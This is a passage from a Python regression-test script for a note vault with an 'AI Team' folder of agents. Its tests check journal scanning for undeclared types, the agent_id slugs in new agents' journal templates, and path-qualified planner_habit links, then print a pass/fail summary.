        _jrep = None
    if _jrep is None:
        fails.append("journal-in-scope/undeclared-type: check-quality exited %d "
                     "or printed no JSON: %s"
                     % (_jq.returncode, (_jq.stderr or _jq.stdout or "").strip()[:300]))
    else:
        _jrel = "06 AI Team/Agents/Mack/Journal/2026-09-16-undeclared-type.md"
        _hit = [f for f in _jrep.get("findings", [])
                if f["path"] == _jrel and f["metric"] == "enum_violations"]
        if not _hit:
            fails.append("journal-in-scope/undeclared-type: a journal entry "
                         "carrying `type: field-notes`, which GL-1002 does not "
                         "declare, produced no enum finding. Agent journals were "
                         "outside SCAN_ROOTS, so nothing read them at all "
                         "(Brian Carroll, B2-8). findings: %s"
                         % sorted({f["path"] for f in _jrep.get("findings", [])}))
    # 91b. The control, twice over: the glob must not drag the ROOM in, and
    #      a `_template.md` beside the entry must stay out (SKIP_NAMES).
    checks += 1
    _bad_j.write_text(
        "---\ntype: journal-entry\nagent_id: mack\ncreated: 2026-09-16\n"
        "topic: a type GL-1002 does declare\n---\n\n## What I learned\n",
        encoding="utf-8")
    (_jdir / "_template.md").write_text(
        "---\ntype: field-notes\nagent_id: mack\n---\n\n## What I learned\n",
        encoding="utf-8")
    _jq2 = subprocess.run([PY, str(_jv / "06 AI Team/AI Team Knowledge/Scripts/check-quality.py"),
                           str(_jv), "--json"], capture_output=True, text=True)
    try:
        _jrep2 = json.loads(_jq2.stdout) if _jq2.returncode == 0 else None
    except ValueError:
        _jrep2 = None
    if _jrep2 is None:
        fails.append("journal-in-scope/glob-not-the-room: check-quality exited "
                     "%d or printed no JSON: %s"
                     % (_jq2.returncode, (_jq2.stderr or _jq2.stdout or "").strip()[:300]))
    else:
        _noise = sorted({f["path"] for f in _jrep2.get("findings", [])
                         if f["path"].startswith("06 AI Team/")})
        if _noise:
            fails.append("journal-in-scope/glob-not-the-room: with every journal "
                         "entry declaring a GL-1002 type, %d finding(s) still "
                         "come out of 06 AI Team/. Either the room was widened "
                         "instead of the glob, or _template.md stopped being "
                         "skipped: %s" % (len(_noise), _noise))

# ===========================================================================
# ---- END mack b8 ----


# ---- BEGIN silas b8 ----
# ===========================================================================
# 87-88. THE TWO SCHEMA RULINGS OF 1.27.0 (Brian Carroll round two).
#
# Own block, own edges, at the end of the file on purpose: Mack is editing
# this same file for B2-1, B2-4 and B2-5, and two people writing into the
# middle of it at once is a rebase nobody needs.
#
# Both were watched RED on 12b0612 (the 1.26.0 tag) before their fix landed:
#   87  a hire named Quill got `agent_id: charta`
#   88  new-entity.py wrote `planner_habit: "[[Morning walk]]"`
#
# WHAT THESE DO NOT PROVE: that existing vaults are repaired. Neither fix
# migrates anything already on disk; SOP-1014 step 3 carries the two
# deterministic repairs for a vault upgrading into 1.27.0.
with tempfile.TemporaryDirectory() as _b8td:
    _b8 = Path(_b8td)

    # 87. A HIRE'S JOURNAL TEMPLATE CARRIES ITS OWN SLUG.
    #
    # new-agent.py step 5 used to seed `Journal/_template.md` by copying the
    # first sibling that had one, which in this repo is always Charta. Every
    # hire was handed `agent_id: charta` and every entry written from that
    # template claimed to be Charta's. It passes YAML and it passes the eye,
    # so nothing but a test looks at it.
    _hv = fixture_vault(_b8, "b8-hire")
    checks += 1
    _r = subprocess.run([PY, str(_hv / "06 AI Team/AI Team Knowledge/Scripts/new-agent.py"),
                         "Quill", "--slug", "quill", "--role", "Book Writer",
                         "--root", str(_hv)], capture_output=True, text=True)
    _tpl = _hv / "06 AI Team/Agents/Quill/Journal/_template.md"
    if _r.returncode != 0:
        fails.append("new-agent/hire-template-owns-its-slug: the hire itself was "
                     "refused (exit %d): %s"
                     % (_r.returncode, (_r.stderr or _r.stdout or "").strip()[:300]))
    elif not _tpl.is_file():
        fails.append("new-agent/hire-template-owns-its-slug: no "
                     "Agents/Quill/Journal/_template.md was written")
    else:
        _m = re.search(r"(?m)^agent_id:\s*(\S+)", _tpl.read_text(encoding="utf-8"))
        _got = _m.group(1) if _m else None
        if _got != "quill":
            fails.append("new-agent/hire-template-owns-its-slug: Quill's journal "
                         "template reads agent_id: %r, not 'quill'. A template "
                         "carrying another agent's id mislabels every entry copied "
                         "from it (Brian Carroll, B2-7)" % _got)

    # 88. new-entity.py WRITES planner_habit PATH-QUALIFIED.
    #
    # A habit and its planner-habit note carry the SAME name by design, one in
    # 02 Planner/Habits/ and one in 04 Inner World/My Life/Habits/. A bare
    # [[Morning walk]] cannot say which of the two it means, so GL-1002 wants
    # the full vault path on both sides of the pair (ruling 2026-09-16).
    #
    # The fixture plants only the Planner half, so the link resolves to exactly
    # one note and this case measures the SHAPE of what is written, never the
    # resolver's tie-break.
    _ev = fixture_vault(_b8, "b8-habit")
    _ph = _ev / "02 Planner/Habits"
    _ph.mkdir(parents=True, exist_ok=True)
    (_ph / "Morning walk.md").write_text(
        "---\ntype: planner-habit\nname: Morning walk\ncadence: daily\n"
        "status: active\ncreated: 2026-09-16\ntags: []\n---\n\n## Log\n",
        encoding="utf-8")
    checks += 1
    _r2 = subprocess.run([PY, str(_ev / "06 AI Team/AI Team Knowledge/Scripts/new-entity.py"),
                          "habit", "Morning walk", "--link", "[[Morning walk]]",
                          "--root", str(_ev)], capture_output=True, text=True)
    _note = _ev / "04 Inner World/My Life/Habits/Morning walk.md"
    if _r2.returncode != 0:
        fails.append("new-entity/planner-habit-link-is-qualified: creating the "
                     "habit was refused (exit %d): %s"
                     % (_r2.returncode, (_r2.stderr or _r2.stdout or "").strip()[:300]))
    elif not _note.is_file():
        fails.append("new-entity/planner-habit-link-is-qualified: no habit note "
                     "was written")
    else:
        _m2 = re.search(r'(?m)^planner_habit:\s*"?\[\[([^\]]+)\]\]"?',
                        _note.read_text(encoding="utf-8"))
        _got2 = _m2.group(1) if _m2 else None
        if _got2 != "02 Planner/Habits/Morning walk":
            fails.append("new-entity/planner-habit-link-is-qualified: wrote "
                         "planner_habit [[%s]], not [[02 Planner/Habits/Morning "
                         "walk]]. A bare link names two notes and resolves to "
                         "whichever one is nearer (Brian Carroll, B2-3)" % _got2)
# ===========================================================================
# ---- END silas b8 ----


if fails:
    for f in fails:
        print(f"FAIL {f}", file=sys.stderr)
    if FAST:
        print("This was a --fast run: %s were NOT run." % ", ".join(fast_skipped),
              file=sys.stderr)
    sys.exit(1)
controls = "the capture clean control" if skips else "the manifest and capture clean controls"
tail = f", {len(skips)} skipped ({skips[0][1]})" if skips else ""
print(f"OK {checks}/{checks} guards went red on bad input{tail} (plus {controls} stayed green)")
if PYCACHE_NOTE:
    print("NOTE interpreter/bytecode-in-tree-is-invisible: " + PYCACHE_NOTE)
if FAST:
    print("FAST RUN. Not a green for: " + ", ".join(fast_skipped)
          + ". Run this file with no arguments before citing it as a full pass.")
